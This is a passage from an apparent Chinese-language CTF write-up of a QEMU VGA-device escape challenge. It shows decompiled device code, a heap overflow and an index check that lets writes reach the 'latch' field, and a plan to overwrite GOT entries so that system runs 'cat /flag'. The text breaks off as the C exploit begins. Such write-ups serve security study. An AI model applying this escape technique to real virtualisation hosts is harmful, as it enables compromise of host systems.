C0                         xor     eax, eax</span><br><span class="line">.text:000000000068F545 5B                            pop     s</span><br><span class="line">.text:000000000068F546 5D                            pop     rbp</span><br><span class="line">.text:000000000068F547 E9 F4 99 D7 FF                jmp     ___printf_chk</span><br><span class="line"></span><br><span class="line">······</span><br><span class="line"></span><br><span class="line">.text:000000000068F47B 48 89 E9                      mov     rcx, rbp</span><br><span class="line">.text:000000000068F47E 48 C1 E1 04                   shl     rcx, 4</span><br><span class="line">.text:000000000068F482 48 01 CB                      add     s, rcx</span><br><span class="line">.text:000000000068F485 48 85 C0                      test    rax, rax</span><br><span class="line">.text:000000000068F488 48 89 83 D8 33 01 00          mov     [rbx+133D8h], rax</span><br><span class="line">.text:000000000068F48F 0F 84 C9 FD FF FF             jz      loc_68F25E</span><br><span class="line">.text:000000000068F48F</span><br><span class="line">.text:000000000068F495 48 8B 54 24 08                mov     rdx, qword ptr [rsp+28h+chunk_size]</span><br><span class="line">.text:000000000068F49A 48 83 C5 01                   add     rbp, 1</span><br><span class="line">.text:000000000068F49E 48 89 2D 3B A0 A3 00          mov     cs:vulncnt, rbp</span><br><span class="line">.text:000000000068F4A5 81 E2 FF FF 00 00             and     edx, 0FFFFh</span><br><span class="line">.text:000000000068F4AB 89 93 E0 33 01 00             mov     [rbx+133E0h], edx</span><br><span class="line">.text:000000000068F4B1 E9 A8 FD FF FF                jmp     loc_68F25E</span><br></pre></td></tr></table></figure><p>上面可以看到漏洞点是<code>v5 == 4</code>时，对<code>cur_size</code>没有检测，可以实现堆溢出，当然我感觉三可以修改最大size配合二也是可以实现堆溢出，但是直接用四即可实现所以也没必要再去搞三二了。</p><p>再就是存在一个大的问题就是，上面所有对idx的验证就是小于等于16，所以这一出也就导致我们可以溢出到下一个成员<code>latch</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">cydf_vga_mem_read</span><span class="params">(CydfVGAState *opaque, hwaddr addr, <span class="keyword">uint32_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">bool</span> v4; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;latch[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !(_WORD)v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (opaque-&gt;vga.sr[<span class="number">7</span>] &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">    opaque-&gt;latch[<span class="number">0</span>] = addr | v3;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">    <span class="keyword">return</span> vga_mem_readb(&amp;opaque-&gt;vga, addr);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = (opaque-&gt;vga.sr[<span class="number">7</span>] &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">  opaque-&gt;latch[<span class="number">0</span>] = (_DWORD)addr &lt;&lt; <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">return</span> vga_mem_readb(&amp;opaque-&gt;vga, addr);</span><br><span class="line">LABEL_3:</span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0xFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">255LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( addr - <span class="number">0x18000</span> &lt;= <span class="number">0xFF</span> &amp;&amp; (opaque-&gt;vga.sr[<span class="number">23</span>] &amp; <span class="number">0x44</span>) == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> cydf_mmio_blt_read(opaque, (<span class="keyword">unsigned</span> __int8)addr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFF</span>LL;</span><br><span class="line">    v6 = (<span class="keyword">char</span> *)opaque + <span class="number">4</span> * (addr &gt;&gt; <span class="number">15</span>);</span><br><span class="line">    v7 = addr &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; *((_DWORD *)v6 + <span class="number">0x44D5</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *((_DWORD *)v6 + <span class="number">0x44D3</span>) + v7;</span><br><span class="line">      <span class="keyword">if</span> ( (opaque-&gt;vga.gr[<span class="number">11</span>] &amp; <span class="number">0x14</span>) == <span class="number">20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 *= <span class="number">16</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( (opaque-&gt;vga.gr[<span class="number">11</span>] &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 *= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;vga.vram_ptr[opaque-&gt;cydf_addr_mask &amp; v8];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在这个函数中其实是可以控制<code>latch[0]</code>的值的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( (<span class="keyword">char</span>)sr_index )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    opaque-&gt;vga.sr[(<span class="keyword">unsigned</span> __int8)sr_index] = sr_mask[(<span class="keyword">unsigned</span> __int8)sr_index] &amp; v4;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)sr_index == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">    opaque-&gt;vga.sr[<span class="number">6</span>] = <span class="number">3</span> * ((v4 &amp; <span class="number">0x17</span>) == <span class="number">18</span>) + <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">    cydf_update_memory_access(opaque);</span><br><span class="line">    sr_index = opaque-&gt;vga.sr_index;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xB</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xC</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xD</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xE</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xF</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x15</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x16</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x18</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x19</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1A</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1B</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1C</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1D</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1E</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1F</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xCC</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xCD</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xCE</span>:</span><br><span class="line">    LABEL_28:</span><br><span class="line">    opaque-&gt;vga.sr[sr_index] = v4;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在这里我们正好可以控制<code>opaque-&gt;vga.sr[0xCC]</code>的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qemu_log</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v4; <span class="comment">// r8</span></span><br><span class="line">  __int64 v5; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">int</span> ret; <span class="comment">// [rsp+1Ch] [rbp-D4h]</span></span><br><span class="line">  gcc_va_list va; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-B8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+48h] [rbp-A8h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+50h] [rbp-A0h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+58h] [rbp-98h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+60h] [rbp-90h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+68h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  va_start(va, fmt);</span><br><span class="line">  v3 = va_arg(va, _QWORD);</span><br><span class="line">  v1 = va_arg(va, _QWORD);</span><br><span class="line">  v2 = va_arg(va, _QWORD);</span><br><span class="line">  v4 = va_arg(va, _QWORD);</span><br><span class="line">  v5 = va_arg(va, _QWORD);</span><br><span class="line">  va_end(va);</span><br><span class="line">  v10 = v3;</span><br><span class="line">  v11 = v1;</span><br><span class="line">  v12 = v2;</span><br><span class="line">  v13 = v4;</span><br><span class="line">  v14 = v5;</span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( qemu_logfile )</span><br><span class="line">  &#123;</span><br><span class="line">    va_start(va, fmt);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    ret = <span class="built_in">vfprintf</span>(qemu_logfile, fmt, va);</span><br><span class="line">    <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>qemu_log</code>函数中，存在一个<code>vfprintf</code>函数调用了bss上的一个变量<code>qemu_logfile</code>。那么利用思路如下：</p><ol><li>  修改qemu_logfile的内容为<code>cat /flag</code></li><li>  修改vfprintf函数的got表为system</li><li>  修改printf_chk函数的got表为qemu_log</li><li>  最后让v5等于2，触发printf_chk</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先吐槽一点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">switch ( addr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> 4uLL:</span><br><span class="line">  <span class="keyword">case</span> 0x24uLL:</span><br><span class="line">  opaque-&gt;vga.cr_index = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 5uLL:</span><br><span class="line">  <span class="keyword">case</span> 0x25uLL:</span><br><span class="line">  cr_index = opaque-&gt;vga.cr_index;</span><br><span class="line">  <span class="keyword">if</span> ( (unsigned __int8)cr_index &lt;= 0x18u )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> ( (opaque-&gt;vga.cr[17] &amp; 0x80u) == 0 || (unsigned __int8)cr_index &gt; 7u )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[(unsigned __int8)cr_index] = value;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)cr_index != 24 &amp;&amp; ((1LL &lt;&lt; <span class="string">cr_index) &amp; 0x8200F1) != 0 )</span></span><br><span class="line"><span class="string">  LABEL_35:</span></span><br><span class="line"><span class="string">  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else if ( (_BYTE)cr_index</span> == 7 )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[7] = value &amp; 0x10 | opaque-&gt;vga.cr[7] &amp; 0xEF;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (unsigned __int8)cr_index &lt;= 0x1Du )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[cr_index] = value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0xAuLL:</span><br><span class="line">  <span class="keyword">case</span> 0x2AuLL:</span><br><span class="line">  opaque-&gt;vga.fcr = value &amp; 0x10;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x10uLL:</span><br><span class="line">  ar_flip_flop = opaque-&gt;vga.ar_flip_flop;</span><br><span class="line">  <span class="keyword">if</span> ( ar_flip_flop )</span><br><span class="line">  &#123;</span><br><span class="line">  v13 = opaque-&gt;vga.ar_index &amp; 0x1F;</span><br><span class="line">  switch ( opaque-&gt;vga.ar_index &amp; 0x1F )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">case</span> 0:</span><br><span class="line">  <span class="keyword">case</span> 1:</span><br><span class="line">  <span class="keyword">case</span> 2:</span><br><span class="line">  <span class="keyword">case</span> 3:</span><br><span class="line">  <span class="keyword">case</span> 4:</span><br><span class="line">  <span class="keyword">case</span> 5:</span><br><span class="line">  <span class="keyword">case</span> 6:</span><br><span class="line">  <span class="keyword">case</span> 7:</span><br><span class="line">  <span class="keyword">case</span> 8:</span><br><span class="line">  <span class="keyword">case</span> 9:</span><br><span class="line">  <span class="keyword">case</span> 0xA:</span><br><span class="line">  <span class="keyword">case</span> 0xB:</span><br><span class="line">  <span class="keyword">case</span> 0xC:</span><br><span class="line">  <span class="keyword">case</span> 0xD:</span><br><span class="line">  <span class="keyword">case</span> 0xE:</span><br><span class="line">  <span class="keyword">case</span> 0xF:</span><br><span class="line">  <span class="keyword">case</span> 0x12:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value &amp; 0x3F;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x10:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value &amp; 0xEF;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x11:</span><br><span class="line">  goto LABEL_42;</span><br><span class="line">  <span class="keyword">case</span> 0x13:</span><br><span class="line">  <span class="keyword">case</span> 0x14:</span><br><span class="line">  LOBYTE(value) = value &amp; 0xF;</span><br><span class="line">  LABEL_42:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  default:</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.ar_index = value &amp; 0x3F;</span><br><span class="line">  &#125;</span><br><span class="line">  opaque-&gt;vga.ar_flip_flop = ar_flip_flop ^ 1;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x12uLL:</span><br><span class="line">  opaque-&gt;vga.msr = value &amp; 0xEF;</span><br><span class="line">  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x14uLL:</span><br><span class="line">  opaque-&gt;vga.sr_index = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>着狗屎ida翻译的是0x14</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000068F5F6 48 81 EB B4 03 00 00          sub     addr, 3B4h                      ; switch 39 cases</span><br><span class="line">.text:000000000068F5FD 48 83 FB 26                   cmp     rbx, 26h</span><br><span class="line">.text:000000000068F601 77 C1                         ja      short def_68F603                ; jumptable 000000000068F603 default case, cases 950-953,955-959,961,963,970-973,976-979,982-985</span><br><span class="line">.text:000000000068F601                                                                       ; jumptable 000000000068F792 default case, cases 5,32-47,50-79,82-111,114-143,146-175,178-203,207,210-239</span><br><span class="line">.text:000000000068F601</span><br><span class="line">.text:000000000068F603 FF 24 DD 78 8E A9 00          jmp     ds:jpt_68F603[rbx*8]            ; switch jump</span><br></pre></td></tr></table></figure><p> 在这里是减去0x3B4</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315161250131.png"                      alt="image-20230315161250131"                ></p><p>但是这里真正需要的是0x10，又一次翻译错误。</p><p>忽略这些小错误之后直接编写exp即可</p><h3 id="综上，可得exp"><a href="#综上，可得exp" class="headerlink" title="综上，可得exp"></a>综上，可得exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span 